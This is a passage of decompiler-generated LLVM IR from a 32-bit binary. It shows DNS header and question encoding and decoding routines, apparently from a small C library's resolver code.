  %v0_80540fb = phi i32 [ 0, %dec_label_pc_805404f ], [ %v5_80540df, %dec_label_pc_80540d5 ], [ %v3_8053f58, %dec_label_pc_8053f4c ], [ 0, %dec_label_pc_80540f6 ]
  store i32 %v0_80540fb, i32* %eax.global-to-local, align 4
  store i32 %v0_8053f34, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80540fb

; uselistorder directives
  uselistorder i32 %v0_80540fb, { 1, 0 }
  uselistorder i32 %v0_80540ba, { 1, 0 }
  uselistorder i1 %v10_80540a5, { 1, 0 }
  uselistorder i32 %v0_80540a5.pre, { 1, 0, 2 }
  uselistorder i32 %v1_805409b, { 1, 0, 2 }
  uselistorder i32 %v1_8054087, { 1, 0 }
  uselistorder i32 %v0_8054090, { 3, 2, 0, 1 }
  uselistorder i32 %v2_805401c, { 1, 0 }
  uselistorder i32 %v2_8054015, { 1, 2, 0 }
  uselistorder i32 %stack_var_-116.159, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.160, { 2, 1, 0 }
  uselistorder i32 %v0_805402e61, { 3, 2, 1, 0 }
  uselistorder i32 %v1_805402062, { 2, 1, 0 }
  uselistorder i32 %v0_805402a63, { 2, 6, 5, 1, 4, 3, 0 }
  uselistorder i32 %v2_8054005, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_80540a517, { 1, 0 }
  uselistorder i32 %v1_8053ffa, { 1, 0 }
  uselistorder i32 %v0_8053ffa, { 1, 0, 2 }
  uselistorder i32 %v5_8054002, { 1, 2, 0 }
  uselistorder i32 %v1_8053fdd, { 0, 2, 1 }
  uselistorder i32 %v0_8053fcd8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8053fd812, { 1, 2, 0, 3 }
  uselistorder i1 %v10_8053fc8, { 1, 0 }
  uselistorder i32 %v0_8053ff365, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8053fe866, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8053fdd68, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_8053f9569, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8053f34, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 14, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 97, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder [3 x i8]* @global_var_8057a71.247, { 1, 0 }
  uselistorder i8 58, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 65535, { 0, 1, 3, 2 }
  uselistorder i32 64, { 7, 2, 9, 6, 8, 5, 1, 3, 0, 4 }
  uselistorder i32* @esp, { 0, 1, 147, 7, 148, 149, 150, 151, 152, 153, 8, 259, 260, 261, 262, 263, 264, 265, 10, 266, 267, 268, 269, 270, 16, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 12, 281, 282, 283, 13, 284, 9, 285, 286, 287, 288, 289, 290, 14, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 11, 304, 305, 306, 307, 308, 309, 15, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 213, 17, 214, 2, 3, 331, 4, 5, 6, 18, 215, 216, 217, 218, 19, 219, 220, 221, 222, 22, 223, 224, 225, 23, 226, 24, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 21, 240, 25, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 20, 253, 254, 255, 256, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 80, 79, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 102, 101, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 257, 258 }
  uselistorder i32 15, { 0, 4, 8, 7, 1, 6, 5, 2, 3 }
  uselistorder i32 60, { 4, 5, 6, 7, 0, 8, 3, 2, 1 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 12, 11, 14, 13 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 6, 9, 10, 3, 16, 14, 13, 15, 4, 1, 2, 7, 8, 5, 11, 12 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80540f8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_80540f6, { 1, 0 }
  uselistorder label %dec_label_pc_80540b6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805409b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054032, { 1, 0 }
  uselistorder label %dec_label_pc_805402a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054010, { 1, 0 }
  uselistorder label %dec_label_pc_8054005, { 1, 0 }
  uselistorder label %dec_label_pc_8053ff5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053ff1, { 1, 0 }
  uselistorder label %dec_label_pc_8053fdd, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8053fda, { 1, 0 }
  uselistorder label %dec_label_pc_8053fb0, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8054108 = load i32, i32* @ebx, align 4
  store i32 %v0_8054108, i32* %stack_var_-8, align 4
  store i32 %tmp8, i32* %ebx.global-to-local, align 4
  %v4_8054112 = ptrtoint i8* %tmp to i32
  store i32 %v4_8054112, i32* %esi.global-to-local, align 4
  %v7_8054116 = icmp sgt i32 %tmp9, 11
  br i1 %v7_8054116, label %dec_label_pc_805411c, label %dec_label_pc_80541b0

dec_label_pc_805411c:                             ; preds = %entry
  %v1_805411c = add i32 %tmp8, 1
  %v2_805411c = inttoptr i32 %v1_805411c to i8*
  %v3_805411c = load i8, i8* %v2_805411c, align 1
  store i8 %v3_805411c, i8* %tmp, align 1
  %v0_8054122 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054122 = inttoptr i32 %v0_8054122 to i32*
  %v2_8054122 = load i32, i32* %v1_8054122, align 4
  %v1_8054124 = trunc i32 %v2_8054122 to i8
  %v2_8054124 = load i32, i32* %esi.global-to-local, align 4
  %v3_8054124 = add i32 %v2_8054124, 1
  %v4_8054124 = inttoptr i32 %v3_8054124 to i8*
  store i8 %v1_8054124, i8* %v4_8054124, align 1
  store i32 4, i32* %edx.global-to-local, align 4
  %v0_8054149 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054149 = add i32 %v0_8054149, 8
  %v2_8054149 = inttoptr i32 %v1_8054149 to i32*
  %v3_8054149 = load i32, i32* %v2_8054149, align 4
  %v1_805414c = mul i32 %v3_8054149, 8
  %v2_805414f = and i32 %v1_805414c, 120
  %v2_8054152 = or i32 %v2_805414f, 4
  store i32 %v2_8054152, i32* %edx.global-to-local, align 4
  %v1_8054154 = add i32 %v0_8054149, 20
  %v2_8054154 = inttoptr i32 %v1_8054154 to i32*
  %v3_8054154 = load i32, i32* %v2_8054154, align 4
  %v4_8054154 = icmp eq i32 %v3_8054154, 0
  %v1_8054158 = icmp eq i1 %v4_8054154, false
  %v2_8054158 = zext i1 %v1_8054158 to i32
  %v2_805415b = or i32 %v2_8054158, %v2_8054152
  store i32 %v2_805415b, i32* %edx.global-to-local, align 4
  %v2_805415d = or i32 %v2_805415b, 130
  %v3_805415d = trunc i32 %v2_805415d to i8
  store i32 %v2_805415d, i32* @ecx, align 4
  %v2_805415f = load i32, i32* %esi.global-to-local, align 4
  %v3_805415f = add i32 %v2_805415f, 2
  %v4_805415f = inttoptr i32 %v3_805415f to i8*
  store i8 %v3_805415d, i8* %v4_805415f, align 1
  %v0_8054162 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054166 = add i32 %v0_8054162, 28
  %v2_8054166 = inttoptr i32 %v1_8054166 to i8*
  %v3_8054166 = load i8, i8* %v2_8054166, align 1
  %v5_8054166 = load i32, i32* %edx.global-to-local, align 4
  %v2_805416f = urem i8 %v3_8054166, 16
  %v7_805416f = zext i8 %v2_805416f to i32
  %v9_805416f = and i32 %v5_8054166, -256
  %v10_805416f = or i32 %v9_805416f, %v7_805416f
  store i32 %v10_805416f, i32* %edx.global-to-local, align 4
  %v2_8054172 = or i8 %v2_805416f, -128
  %v2_8054174 = load i32, i32* %esi.global-to-local, align 4
  %v3_8054174 = add i32 %v2_8054174, 3
  %v4_8054174 = inttoptr i32 %v3_8054174 to i8*
  store i8 %v2_8054172, i8* %v4_8054174, align 1
  %v0_8054177 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054177 = add i32 %v0_8054177, 33
  %v2_8054177 = inttoptr i32 %v1_8054177 to i8*
  %v3_8054177 = load i8, i8* %v2_8054177, align 1
  %v2_805417b = load i32, i32* %esi.global-to-local, align 4
  %v3_805417b = add i32 %v2_805417b, 4
  %v4_805417b = inttoptr i32 %v3_805417b to i8*
  store i8 %v3_8054177, i8* %v4_805417b, align 1
  %v0_805417e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805417e = add i32 %v0_805417e, 32
  %v2_805417e = inttoptr i32 %v1_805417e to i32*
  %v3_805417e = load i32, i32* %v2_805417e, align 4
  %v1_8054181 = trunc i32 %v3_805417e to i8
  %v2_8054181 = load i32, i32* %esi.global-to-local, align 4
  %v3_8054181 = add i32 %v2_8054181, 5
  %v4_8054181 = inttoptr i32 %v3_8054181 to i8*
  store i8 %v1_8054181, i8* %v4_8054181, align 1
  %v0_8054184 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054184 = add i32 %v0_8054184, 37
  %v2_8054184 = inttoptr i32 %v1_8054184 to i8*
  %v3_8054184 = load i8, i8* %v2_8054184, align 1
  %v2_8054188 = load i32, i32* %esi.global-to-local, align 4
  %v3_8054188 = add i32 %v2_8054188, 6
  %v4_8054188 = inttoptr i32 %v3_8054188 to i8*
  store i8 %v3_8054184, i8* %v4_8054188, align 1
  %v0_805418b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805418b = add i32 %v0_805418b, 36
  %v2_805418b = inttoptr i32 %v1_805418b to i32*
  %v3_805418b = load i32, i32* %v2_805418b, align 4
  %v1_805418e = trunc i32 %v3_805418b to i8
  %v2_805418e = load i32, i32* %esi.global-to-local, align 4
  %v3_805418e = add i32 %v2_805418e, 7
  %v4_805418e = inttoptr i32 %v3_805418e to i8*
  store i8 %v1_805418e, i8* %v4_805418e, align 1
  %v0_8054191 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054191 = add i32 %v0_8054191, 41
  %v2_8054191 = inttoptr i32 %v1_8054191 to i8*
  %v3_8054191 = load i8, i8* %v2_8054191, align 1
  %v2_8054195 = load i32, i32* %esi.global-to-local, align 4
  %v3_8054195 = add i32 %v2_8054195, 8
  %v4_8054195 = inttoptr i32 %v3_8054195 to i8*
  store i8 %v3_8054191, i8* %v4_8054195, align 1
  %v0_8054198 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054198 = add i32 %v0_8054198, 40
  %v2_8054198 = inttoptr i32 %v1_8054198 to i32*
  %v3_8054198 = load i32, i32* %v2_8054198, align 4
  %v1_805419b = trunc i32 %v3_8054198 to i8
  %v2_805419b = load i32, i32* %esi.global-to-local, align 4
  %v3_805419b = add i32 %v2_805419b, 9
  %v4_805419b = inttoptr i32 %v3_805419b to i8*
  store i8 %v1_805419b, i8* %v4_805419b, align 1
  %v0_805419e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805419e = add i32 %v0_805419e, 45
  %v2_805419e = inttoptr i32 %v1_805419e to i8*
  %v3_805419e = load i8, i8* %v2_805419e, align 1
  %v2_80541a2 = load i32, i32* %esi.global-to-local, align 4
  %v3_80541a2 = add i32 %v2_80541a2, 10
  %v4_80541a2 = inttoptr i32 %v3_80541a2 to i8*
  store i8 %v3_805419e, i8* %v4_80541a2, align 1
  %v0_80541a5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80541a5 = add i32 %v0_80541a5, 44
  %v2_80541a5 = inttoptr i32 %v1_80541a5 to i32*
  %v3_80541a5 = load i32, i32* %v2_80541a5, align 4
  %v1_80541a8 = trunc i32 %v3_80541a5 to i8
  %v2_80541a8 = load i32, i32* %esi.global-to-local, align 4
  %v3_80541a8 = add i32 %v2_80541a8, 11
  %v4_80541a8 = inttoptr i32 %v3_80541a8 to i8*
  store i8 %v1_80541a8, i8* %v4_80541a8, align 1
  %v2_80541b0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80541b0

dec_label_pc_80541b0:                             ; preds = %entry, %dec_label_pc_805411c
  %v2_80541b0 = phi i32 [ %v0_8054108, %entry ], [ %v2_80541b0.pre, %dec_label_pc_805411c ]
  %v0_80541b2 = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_805411c ]
  store i32 %v2_80541b0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80541b2

; uselistorder directives
  uselistorder i32 45, { 4, 1, 3, 0, 2 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 3, 1, 0, 2 }
  uselistorder i32 33, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_80541b0, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_80541b4 = load i32, i32* @ebx, align 4
  store i32 %v0_80541b4, i32* %stack_var_-4, align 4
  %v4_80541b5 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_80541b5, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_80541bd = load i8, i8* %tmp2, align 1
  %v3_80541bd = zext i8 %v2_80541bd to i32
  %v1_80541c0 = add i32 %v4_80541b5, 1
  %v2_80541c0 = inttoptr i32 %v1_80541c0 to i8*
  %v3_80541c0 = load i8, i8* %v2_80541c0, align 1
  %v4_80541c0 = zext i8 %v3_80541c0 to i32
  %v2_80541c4 = mul nuw nsw i32 %v3_80541bd, 256
  %v2_80541c7 = or i32 %v4_80541c0, %v2_80541c4
  %v2_80541c9 = inttoptr i32 %tmp to i32*
  store i32 %v2_80541c7, i32* %v2_80541c9, align 4
  %v0_80541cb = load i32, i32* @ecx, align 4
  %v1_80541cb = add i32 %v0_80541cb, 2
  %v2_80541cb = inttoptr i32 %v1_80541cb to i8*
  %v3_80541cb = load i8, i8* %v2_80541cb, align 1
  %tmp6 = icmp slt i8 %v3_80541cb, 0
  %v2_80541cf = zext i1 %tmp6 to i32
  %v1_80541d2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80541d2 = add i32 %v1_80541d2, 4
  %v3_80541d2 = inttoptr i32 %v2_80541d2 to i32*
  store i32 %v2_80541cf, i32* %v3_80541d2, align 4
  %v0_80541d5 = load i32, i32* @ecx, align 4
  %v1_80541d5 = add i32 %v0_80541d5, 2
  %v2_80541d5 = inttoptr i32 %v1_80541d5 to i8*
  %v3_80541d5 = load i8, i8* %v2_80541d5, align 1
  %v3_80541d8 = udiv i8 %v3_80541d5, 8
  %tmp7 = urem i8 %v3_80541d8, 16
  %v1_80541db = zext i8 %tmp7 to i32
  %v1_80541de = load i32, i32* %ebx.global-to-local, align 4
  %v2_80541de = add i32 %v1_80541de, 8
  %v3_80541de = inttoptr i32 %v2_80541de to i32*
  store i32 %v1_80541db, i32* %v3_80541de, align 4
  %v0_80541e1 = load i32, i32* @ecx, align 4
  %v1_80541e1 = add i32 %v0_80541e1, 2
  %v2_80541e1 = inttoptr i32 %v1_80541e1 to i8*
  %v3_80541e1 = load i8, i8* %v2_80541e1, align 1
  %div = udiv i8 %v3_80541e1, 4
  %tmp8 = urem i8 %div, 2
  %v1_80541e8 = zext i8 %tmp8 to i32
  %v1_80541eb = load i32, i32* %ebx.global-to-local, align 4
  %v2_80541eb = add i32 %v1_80541eb, 12
  %v3_80541eb = inttoptr i32 %v2_80541eb to i32*
  store i32 %v1_80541e8, i32* %v3_80541eb, align 4
  %v0_80541ee = load i32, i32* @ecx, align 4
  %v1_80541ee = add i32 %v0_80541ee, 2
  %v2_80541ee = inttoptr i32 %v1_80541ee to i8*
  %v3_80541ee = load i8, i8* %v2_80541ee, align 1
  %div5 = udiv i8 %v3_80541ee, 2
  %tmp9 = urem i8 %div5, 2
  %v1_80541f4 = zext i8 %tmp9 to i32
  %v1_80541f7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80541f7 = add i32 %v1_80541f7, 16
  %v3_80541f7 = inttoptr i32 %v2_80541f7 to i32*
  store i32 %v1_80541f4, i32* %v3_80541f7, align 4
  %v0_80541fa = load i32, i32* @ecx, align 4
  %v1_80541fa = add i32 %v0_80541fa, 2
  %v2_80541fa = inttoptr i32 %v1_80541fa to i8*
  %v3_80541fa = load i8, i8* %v2_80541fa, align 1
  %tmp10 = urem i8 %v3_80541fa, 2
  %v1_80541fe = zext i8 %tmp10 to i32
  %v1_8054201 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054201 = add i32 %v1_8054201, 20
  %v3_8054201 = inttoptr i32 %v2_8054201 to i32*
  store i32 %v1_80541fe, i32* %v3_8054201, align 4
  %v0_8054204 = load i32, i32* @ecx, align 4
  %v1_8054204 = add i32 %v0_8054204, 3
  %v2_8054204 = inttoptr i32 %v1_8054204 to i8*
  %v3_8054204 = load i8, i8* %v2_8054204, align 1
  %tmp11 = icmp slt i8 %v3_8054204, 0
  %v2_8054208 = zext i1 %tmp11 to i32
  %v1_805420b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805420b = add i32 %v1_805420b, 24
  %v3_805420b = inttoptr i32 %v2_805420b to i32*
  store i32 %v2_8054208, i32* %v3_805420b, align 4
  %v0_805420e = load i32, i32* @ecx, align 4
  %v1_805420e = add i32 %v0_805420e, 3
  %v2_805420e = inttoptr i32 %v1_805420e to i8*
  %v3_805420e = load i8, i8* %v2_805420e, align 1
  %tmp12 = urem i8 %v3_805420e, 16
  %v1_8054212 = zext i8 %tmp12 to i32
  %v1_8054215 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054215 = add i32 %v1_8054215, 28
  %v3_8054215 = inttoptr i32 %v2_8054215 to i32*
  store i32 %v1_8054212, i32* %v3_8054215, align 4
  %v0_8054218 = load i32, i32* @ecx, align 4
  %v1_8054218 = add i32 %v0_8054218, 4
  %v2_8054218 = inttoptr i32 %v1_8054218 to i8*
  %v3_8054218 = load i8, i8* %v2_8054218, align 1
  %v4_8054218 = zext i8 %v3_8054218 to i32
  %v1_805421c = add i32 %v0_8054218, 5
  %v2_805421c = inttoptr i32 %v1_805421c to i8*
  %v3_805421c = load i8, i8* %v2_805421c, align 1
  %v4_805421c = zext i8 %v3_805421c to i32
  %v2_8054220 = mul nuw nsw i32 %v4_8054218, 256
  %v2_8054223 = or i32 %v4_805421c, %v2_8054220
  %v1_8054225 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054225 = add i32 %v1_8054225, 32
  %v3_8054225 = inttoptr i32 %v2_8054225 to i32*
  store i32 %v2_8054223, i32* %v3_8054225, align 4
  %v0_8054228 = load i32, i32* @ecx, align 4
  %v1_8054228 = add i32 %v0_8054228, 6
  %v2_8054228 = inttoptr i32 %v1_8054228 to i8*
  %v3_8054228 = load i8, i8* %v2_8054228, align 1
  %v4_8054228 = zext i8 %v3_8054228 to i32
  %v1_805422c = add i32 %v0_8054228, 7
  %v2_805422c = inttoptr i32 %v1_805422c to i8*
  %v3_805422c = load i8, i8* %v2_805422c, align 1
  %v4_805422c = zext i8 %v3_805422c to i32
  %v2_8054230 = mul nuw nsw i32 %v4_8054228, 256
  %v2_8054233 = or i32 %v4_805422c, %v2_8054230
  %v1_8054235 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054235 = add i32 %v1_8054235, 36
  %v3_8054235 = inttoptr i32 %v2_8054235 to i32*
  store i32 %v2_8054233, i32* %v3_8054235, align 4
  %v0_8054238 = load i32, i32* @ecx, align 4
  %v1_8054238 = add i32 %v0_8054238, 8
  %v2_8054238 = inttoptr i32 %v1_8054238 to i8*
  %v3_8054238 = load i8, i8* %v2_8054238, align 1
  %v4_8054238 = zext i8 %v3_8054238 to i32
  %v1_805423c = add i32 %v0_8054238, 9
  %v2_805423c = inttoptr i32 %v1_805423c to i8*
  %v3_805423c = load i8, i8* %v2_805423c, align 1
  %v4_805423c = zext i8 %v3_805423c to i32
  %v2_8054240 = mul nuw nsw i32 %v4_8054238, 256
  %v2_8054243 = or i32 %v4_805423c, %v2_8054240
  %v1_8054245 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054245 = add i32 %v1_8054245, 40
  %v3_8054245 = inttoptr i32 %v2_8054245 to i32*
  store i32 %v2_8054243, i32* %v3_8054245, align 4
  %v0_8054248 = load i32, i32* @ecx, align 4
  %v1_8054248 = add i32 %v0_8054248, 10
  %v2_8054248 = inttoptr i32 %v1_8054248 to i8*
  %v3_8054248 = load i8, i8* %v2_8054248, align 1
  %v4_8054248 = zext i8 %v3_8054248 to i32
  %v1_805424c = add i32 %v0_8054248, 11
  %v2_805424c = inttoptr i32 %v1_805424c to i8*
  %v3_805424c = load i8, i8* %v2_805424c, align 1
  %v4_805424c = zext i8 %v3_805424c to i32
  %v2_8054250 = mul nuw nsw i32 %v4_8054248, 256
  %v2_8054253 = or i32 %v4_805424c, %v2_8054250
  %v1_8054255 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054255 = add i32 %v1_8054255, 44
  %v3_8054255 = inttoptr i32 %v2_8054255 to i32*
  store i32 %v2_8054253, i32* %v3_8054255, align 4
  %v2_805425d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805425d, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 14, 15, 2, 3, 7, 8, 16, 4, 9, 10, 11, 12, 5, 13, 1, 6, 0 }
  uselistorder i32 40, { 8, 9, 3, 11, 12, 10, 0, 1, 4, 5, 6, 7, 2 }
  uselistorder i32 7, { 20, 21, 4, 7, 5, 0, 3, 8, 15, 16, 17, 18, 19, 6, 2, 1, 14, 9, 10, 11, 12, 13 }
  uselistorder i32 6, { 23, 24, 0, 1, 10, 21, 3, 18, 11, 12, 7, 26, 13, 22, 4, 5, 2, 6, 9, 8, 14, 20, 15, 19, 16, 17, 25 }
  uselistorder i32 28, { 34, 35, 17, 18, 36, 25, 48, 47, 40, 41, 0, 42, 43, 44, 45, 46, 3, 4, 5, 1, 26, 16, 19, 20, 37, 38, 27, 28, 29, 30, 31, 32, 2, 33, 49, 39, 21, 22, 23, 6, 7, 24, 12, 11, 9, 10, 13, 14, 8, 15 }
  uselistorder i8 2, { 1, 2, 3, 4, 5, 18, 6, 0, 22, 19, 7, 8, 9, 10, 11, 12, 20, 21, 13, 16, 17, 14, 15 }
  uselistorder i8 4, { 0, 4, 5, 2, 3, 1 }
  uselistorder i8 16, { 2, 3, 4, 8, 9, 10, 6, 7, 5, 0, 1 }
  uselistorder i8 8, { 0, 8, 3, 7, 4, 5, 6, 1, 2 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8054260 = load i32, i32* @edi, align 4
  %v0_8054261 = load i32, i32* @esi, align 4
  %v0_8054262 = load i32, i32* @ebx, align 4
  store i32 %v0_8054262, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @ebx, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @esi, align 4
  %v0_805426f = load i32, i32* @eax, align 4
  %v1_8054272 = inttoptr i32 %tmp to i32*
  %v2_8054272 = load i32, i32* %v1_8054272, align 4
  %v7_8054274 = inttoptr i32 %v2_8054272 to i8*
  %v8_8054274 = call i32 @__encode_dotted(i8* %v7_8054274, i32 %tmp2, i32 %tmp3, i32 %v0_805426f, i32 %v0_8054262, i32 %v0_8054261, i32 %v0_8054260)
  %v2_805427c = icmp slt i32 %v8_8054274, 0
  store i32 %v8_8054274, i32* @ecx, align 4
  br i1 %v2_805427c, label %dec_label_pc_80542ad, label %dec_label_pc_8054282

dec_label_pc_8054282:                             ; preds = %entry
  %v0_8054282 = load i32, i32* @ebx, align 4
  %v2_8054282 = sub i32 %v0_8054282, %v8_8054274
  %v1_8054284 = add i32 %v2_8054282, -3
  %v6_8054284 = sub i32 2, %v2_8054282
  %v7_8054284 = and i32 %v6_8054284, %v2_8054282
  %v8_8054284 = icmp slt i32 %v7_8054284, 0
  %v9_8054284 = icmp eq i32 %v1_8054284, 0
  %v10_8054284 = icmp slt i32 %v1_8054284, 0
  %v3_8054287 = icmp eq i1 %v10_8054284, %v8_8054284
  %v4_8054287 = icmp eq i1 %v9_8054284, false
  %v5_8054287 = and i1 %v4_8054287, %v3_8054287
  br i1 %v5_8054287, label %dec_label_pc_805428e, label %dec_label_pc_8054289

dec_label_pc_8054289:                             ; preds = %dec_label_pc_8054282
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_80542ad

dec_label_pc_805428e:                             ; preds = %dec_label_pc_8054282
  %v0_805428e = load i32, i32* @edi, align 4
  %v2_805428e = add i32 %v0_805428e, %v8_8054274
  store i32 %v2_805428e, i32* @edx, align 4
  %v0_8054291 = load i32, i32* @esi, align 4
  %v1_8054291 = add i32 %v0_8054291, 5
  %v2_8054291 = inttoptr i32 %v1_8054291 to i8*
  %v3_8054291 = load i8, i8* %v2_8054291, align 1
  %v1_8054295 = add i32 %v8_8054274, 4
  store i32 %v1_8054295, i32* @ecx, align 4
  %v3_8054298 = inttoptr i32 %v2_805428e to i8*
  store i8 %v3_8054291, i8* %v3_8054298, align 1
  %v0_805429a = load i32, i32* @esi, align 4
  %v1_805429a = add i32 %v0_805429a, 4
  %v2_805429a = inttoptr i32 %v1_805429a to i32*
  %v3_805429a = load i32, i32* %v2_805429a, align 4
  %v1_805429d = trunc i32 %v3_805429a to i8
  %v2_805429d = load i32, i32* @edx, align 4
  %v3_805429d = add i32 %v2_805429d, 1
  %v4_805429d = inttoptr i32 %v3_805429d to i8*
  store i8 %v1_805429d, i8* %v4_805429d, align 1
  %v0_80542a0 = load i32, i32* @esi, align 4
  %v1_80542a0 = add i32 %v0_80542a0, 9
  %v2_80542a0 = inttoptr i32 %v1_80542a0 to i8*
  %v3_80542a0 = load i8, i8* %v2_80542a0, align 1
  %v2_80542a4 = load i32, i32* @edx, align 4
  %v3_80542a4 = add i32 %v2_80542a4, 2
  %v4_80542a4 = inttoptr i32 %v3_80542a4 to i8*
  store i8 %v3_80542a0, i8* %v4_80542a4, align 1
  %v0_80542a7 = load i32, i32* @esi, align 4
  %v1_80542a7 = add i32 %v0_80542a7, 8
  %v2_80542a7 = inttoptr i32 %v1_80542a7 to i32*
  %v3_80542a7 = load i32, i32* %v2_80542a7, align 4
  %v1_80542aa = trunc i32 %v3_80542a7 to i8
  %v2_80542aa = load i32, i32* @edx, align 4
  %v3_80542aa = add i32 %v2_80542aa, 3
  %v4_80542aa = inttoptr i32 %v3_80542aa to i8*
  store i8 %v1_80542aa, i8* %v4_80542aa, align 1
  %v0_80542ae.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80542ad

dec_label_pc_80542ad:                             ; preds = %entry, %dec_label_pc_8054289, %dec_label_pc_805428e
  %v0_80542ae = phi i32 [ %v8_8054274, %entry ], [ -1, %dec_label_pc_8054289 ], [ %v0_80542ae.pre, %dec_label_pc_805428e ]
  %v2_80542ad = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80542ad, i32* @ebx, align 4
  store i32 %v0_8054260, i32* @edi, align 4
  ret i32 %v0_80542ae

; uselistorder directives
  uselistorder i32 %v1_8054284, { 1, 0 }
  uselistorder i32 %v2_8054282, { 0, 2, 1 }
  uselistorder i32 %v8_8054274, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 3, 2, 1, 8, 4, 5, 6, 0, 7 }
